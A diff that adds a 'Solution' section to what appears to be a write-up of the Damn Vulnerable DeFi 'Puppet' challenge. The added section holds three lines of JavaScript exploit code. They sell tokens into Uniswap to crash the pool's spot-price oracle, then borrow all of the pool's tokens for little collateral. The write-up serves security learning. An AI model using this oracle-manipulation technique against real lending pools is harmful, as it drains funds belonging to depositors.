@@ -75,8 +75,13 @@ contract PuppetPool is ReentrancyGuard {
         return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
     }
 }
-
 ```
 
 ## Solution
 
+
+```js
+await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, 20775029706);
+await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)});
+```
